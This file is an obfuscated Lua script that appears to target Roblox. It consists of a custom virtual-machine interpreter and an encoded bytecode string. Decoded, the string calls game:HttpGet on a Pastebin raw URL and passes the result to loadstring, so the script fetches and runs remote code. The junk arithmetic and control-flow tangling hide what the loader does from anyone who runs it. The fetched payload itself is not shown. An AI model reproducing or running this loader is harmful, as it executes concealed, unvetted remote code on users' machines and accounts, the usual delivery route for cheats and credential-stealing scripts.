local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v82=v2(v0(v30,16));if v19 then local v89=0;local v90;while true do if (v89==1) then return v90;end if (v89==0) then v90=v5(v82,v19);v19=nil;v89=1;end end else return v82;end end end);local function v20(v31,v32,v33) if v33 then local v83=0;local v84;while true do if (v83==(0 -0)) then v84=(v31/((5 -3)^(v32-(1 + 0))))%(((1271 -(226 + 1044)) + 1)^(((v33-1) -(v32-(1 -0))) + (1638 -((6631 -5108) + 114)))) ;return v84-(v84%(1 + 0)) ;end end else local v85=(4 -2)^(v32-(1066 -(68 + 997))) ;return (((v31%(v85 + v85))>=v85) and (620 -(555 + 64))) or (931 -(857 + 74)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=117 -(32 + 63 + 22) ;local v36;local v37;while true do if (v35==(0 -0)) then v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 1 + 1 ;v35=1 + 0 ;end if (v35==(958 -(892 + 65))) then return (v37 * ((2424 -1814) -354)) + v36 ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + ((2704 -1749) -(802 + 150)) );v18=v18 + (10 -6) ;return (v41 * (30433252 -13656036)) + (v40 * (47703 + 17833)) + (v39 * (1253 -(915 + 82))) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=1 + (1423 -(630 + 793)) ;local v45=(v20(v43,431 -(44 + 386) ,1506 -(998 + 488) ) * ((2 -0)^((4130 -2911) -((5061 -3992) + 118)))) + v42 ;local v46=v20(v43,47 -26 ,67 -36 );local v47=((v20(v43,6 + 11 + 15 )==(1 -0)) and  -(1 + 0)) or 1 ;if (v46==(0 + 0)) then if (v45==(791 -(368 + 423))) then return v47 * (0 -0) ;else v46=3 -2 ;v44=18 -(10 + 8) ;end elseif (v46==(7874 -5827)) then return ((v45==(442 -(416 + (89 -63)))) and (v47 * ((3 -2)/((2632 -(760 + 987)) -(261 + 624))))) or (v47 * NaN) ;end return v8(v47,v46-((2353 -(1789 + 124)) + 583) ) * (v44 + (v45/(2^(91 -39)))) ;end local function v25(v48) local v49;if  not v48 then v48=v23();if (v48==(766 -(745 + 21))) then return "";end end v49=v3(v16,v18,(v18 + v48) -(1 + 0) );v18=v18 + v48 ;local v50={};for v65=2 -1 , #v49 do v50[v65]=v2(v1(v3(v49,v65,v65)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=(function() return 0;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do local v67=(function() return 0 + 0 ;end)();while true do if (v67==1) then if (v51~=(0 + 0)) then else v52=(function() return function(v100,v101,v102) local v103=(function() return 1024 -(706 + 318) ;end)();while true do if (v103~=0) then else v100[v101-#"]" ]=(function() return v102();end)();return v100,v101,v102;end end end;end)();v53=(function() return {};end)();v54=(function() return {};end)();v55=(function() return {};end)();v51=(function() return 1 -0 ;end)();end break;end if (v67==(1251 -(721 + 530))) then if (v51==(1272 -(945 + 326))) then local v95=(function() return 0 -0 ;end)();while true do if (v95==(2 + 0)) then v51=(function() return 2;end)();break;end if (1==v95) then v58=(function() return {};end)();for v109= #"<",v57 do local v110=(function() return 0;end)();local v111=(function() return;end)();local v112=(function() return;end)();local v113=(function() return;end)();while true do if ((700 -(271 + 429))~=v110) then else v111=(function() return 0;end)();v112=(function() return nil;end)();v110=(function() return 1 + 0 ;end)();end if (v110~=(1501 -(1408 + 92))) then else v113=(function() return nil;end)();while true do if (v111==(1700 -(1419 + 281))) then local v164=(function() return 0;end)();while true do if (v164~=(1 -0)) then else v111=(function() return 1;end)();break;end if (v164==0) then v112=(function() return v21();end)();v113=(function() return nil;end)();v164=(function() return 75 -(71 + 3) ;end)();end end end if (v111==(1 + 0)) then if (v112== #"|") then v113=(function() return v21()~=0 ;end)();elseif (v112==(4 -2)) then v113=(function() return v24();end)();elseif (v112== #"xxx") then v113=(function() return v25();end)();end v58[v109]=(function() return v113;end)();break;end end break;end end end v95=(function() return 1 + 1 ;end)();end if ((1171 -(418 + 753))==v95) then v56=(function() return {v53,v54,nil,v55};end)();v57=(function() return v23();end)();v95=(function() return 1 + 0 ;end)();end end end if (v51~=(243 -(187 + 54))) then else v56[ #"gha"]=(function() return v21();end)();for v97= #":",v23() do local v98=(function() return v21();end)();if (v20(v98, #"<", #":")==(780 -(162 + 618))) then local v104=(function() return 0 + 0 ;end)();local v105=(function() return;end)();local v106=(function() return;end)();local v107=(function() return;end)();local v108=(function() return;end)();while true do if (v104~=(2 + 0)) then else while true do if (v105== #"]") then local v159=(function() return 0;end)();while true do if (v159==(529 -(406 + 123))) then v108=(function() return {v22(),v22(),nil,nil};end)();if (v106==(1769 -(1749 + 20))) then local v167=(function() return 0;end)();local v168=(function() return;end)();while true do if (v167==(0 -0)) then v168=(function() return 0;end)();while true do if (v168~=(1322 -(1249 + 73))) then else v108[ #"xxx"]=(function() return v22();end)();v108[ #"http"]=(function() return v22();end)();break;end end break;end end elseif (v106== #"}") then v108[ #"xnx"]=(function() return v23();end)();elseif (v106==(2 -0)) then v108[ #"asd"]=(function() return v23() -((1 + 1)^16) ;end)();elseif (v106~= #"xxx") then else local v175=(function() return 0 + 0 ;end)();local v176=(function() return;end)();while true do if (v175==(1636 -(1373 + 263))) then v176=(function() return 0;end)();while true do if ((1000 -(451 + 549))~=v176) then else v108[ #"nil"]=(function() return v23() -((1 + 1)^16) ;end)();v108[ #"asd1"]=(function() return v22();end)();break;end end break;end end end v159=(function() return 1;end)();end if (v159==(1 -0)) then v105=(function() return 2 -0 ;end)();break;end end end if (v105~= #"asd") then else if (v20(v107, #"19(", #"asd")== #"~") then v108[ #"0836"]=(function() return v58[v108[ #"http"]];end)();end v53[v97]=(function() return v108;end)();break;end if ((1384 -(746 + 638))==v105) then local v161=(function() return 0 + 0 ;end)();local v162=(function() return;end)();while true do if (v161~=0) then else v162=(function() return 0 -0 ;end)();while true do if (v162==(2 -1)) then v105=(function() return  #":";end)();break;end if ((0 -0)~=v162) then else v106=(function() return v20(v98,343 -(218 + 123) , #"-19");end)();v107=(function() return v20(v98, #"0313",1587 -(1535 + 46) );end)();v162=(function() return 115 -(4 + 110) ;end)();end end break;end end end if (v105~=(2 + 0)) then else local v163=(function() return 0;end)();while true do if ((1 + 0)==v163) then v105=(function() return  #"-19";end)();break;end if (v163==0) then if (v20(v107, #" ", #">")== #"[") then v108[562 -(306 + 254) ]=(function() return v58[v108[1 + 1 ]];end)();end if (v20(v107,2,105 -(17 + 86) )== #"[") then v108[ #"19("]=(function() return v58[v108[ #"nil"]];end)();end v163=(function() return 1 -0 ;end)();end end end end break;end if (v104==(1468 -(899 + 568))) then local v150=(function() return 0 + 0 ;end)();while true do if (v150==(0 -0)) then v107=(function() return nil;end)();v108=(function() return nil;end)();v150=(function() return 604 -(268 + 335) ;end)();end if (v150~=(291 -(60 + 230))) then else v104=(function() return 574 -(426 + 146) ;end)();break;end end end if (v104==(0 -0)) then local v151=(function() return 0;end)();while true do if ((1 + 0)~=v151) then else v104=(function() return 167 -(122 + 44) ;end)();break;end if (v151==(1456 -(282 + 1174))) then v105=(function() return 0 -0 ;end)();v106=(function() return nil;end)();v151=(function() return 812 -(569 + 242) ;end)();end end end end end end for v99= #">",v23() do v54,v99,v28=(function() return v52(v54,v99,v28);end)();end return v56;end v67=(function() return 1;end)();end end end end local function v29(v59,v60,v61) local v62=v59[(2 -1) + 0 ];local v63=v59[2];local v64=v59[1 + 0 + 2 ];return function(...) local v68=v62;local v69=v63;local v70=v64;local v71=v27;local v72=1 -0 ;local v73= -(1 + 0);local v74={};local v75={...};local v76=v12("#",...) -(1203 -(373 + 829)) ;local v77={};local v78={};for v86=(0 -0) + 0 ,v76 do if (v86>=v70) then v74[v86-v70 ]=v75[v86 + (1258 -((2795 -1752) + 214)) ];else v78[v86]=v75[v86 + (3 -(1229 -(322 + 905))) ];end end local v79=(v76-v70) + (1213 -(323 + 889)) ;local v80;local v81;while true do v80=v68[v72];v81=v80[2 -1 ];if ((625==625) and (v81<=(245 -(64 + 174)))) then if (v81<=(583 -(361 + (830 -(602 + 9))))) then if (v81<=(321 -(53 + 267))) then if (v81==(0 + 0)) then v78[v80[218 -(42 + 174) ]]={};else local v115=413 -(15 + 398) ;local v116;local v117;while true do if (v115==(0 + 0)) then v116=v80[984 -(18 + 964) ];v117=v78[v80[11 -8 ]];v115=1 + 0 ;end if ((588<1692) and ((1 + 0)==v115)) then v78[v116 + 1 + 0 ]=v117;v78[v116]=v117[v80[854 -(20 + 830) ]];break;end end end elseif ((v81==(2 + (1189 -(449 + 740)))) or (4797<3651)) then v78[v80[128 -(116 + 10) ]]=v80[1 + 2 ];else v78[v80[2 + 0 ]]();end elseif (v81<=(1980 -(1913 + 62))) then if (v81==(3 + 1)) then v78[v80[740 -(542 + 196) ]]();else local v120=v80[1935 -(565 + 1368) ];local v121=v78[v80[6 -3 ]];v78[v120 + 1 + (872 -(826 + 46)) ]=v121;v78[v120]=v121[v80[1665 -(1477 + 184) ]];end elseif (v81>((951 -(245 + 702)) + 2)) then local v125=v80[(3 -2) + 1 ];local v126,v127=v71(v78[v125](v13(v78,v125 + ((1 + 1) -1) ,v80[7 -4 ])));v73=(v127 + v125) -(1552 -(1126 + (2323 -(260 + 1638)))) ;local v128=0 -0 ;for v145=v125,v73 do local v146=405 -((558 -(382 + 58)) + 287) ;while true do if (v146==(0 -0)) then v128=v128 + (1122 -(118 + 1003)) ;v78[v145]=v126[v128];break;end end end else local v129=v80[5 -3 ];v78[v129]=v78[v129](v13(v78,v129 + (378 -((455 -313) + 196 + 39)) ,v73));end elseif (v81<=(49 -38)) then if ((v81<=(2 + 7)) or (4177>4850)) then if (v81==(3 + 5)) then do return;end else v78[v80[979 -(553 + 424) ]]={};end elseif ((v81==10) or (400>1111)) then v78[v80[1615 -(1565 + 48) ]]=v61[v80[(9 -4) -2 ]];else v78[v80[(3388 -2248) -((1987 -(902 + 303)) + 356) ]]=v80[3 + 0 ];end elseif ((3051>1005) and (v81<=(13 + 0))) then if ((3693<=4382) and (v81==(7 + 5))) then v78[v80[4 -2 ]]=v61[v80[2 + 1 ]];else local v138=v80[(3 -1) + 0 ];local v139,v140=v71(v78[v138](v13(v78,v138 + (2 -1) ,v80[7 -4 ])));v73=(v140 + v138) -((6 -3) -2) ;local v141=0 -0 ;for v147=v138,v73 do v141=v141 + (1019 -(60 + 637 + 321)) ;v78[v147]=v139[v141];end end elseif (v81>(5 + 9)) then local v142=v80[9 -7 ];v78[v142]=v78[v142](v13(v78,v142 + (754 -(239 + 514)) ,v73));else do return;end end v72=v72 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F5A6B686632487A6700099Q003Q00120C000100013Q00120C000200023Q00200500020002000300120B000400044Q000D000200044Q000F00013Q00022Q00040001000100012Q000E3Q00017Q00",v9(),...);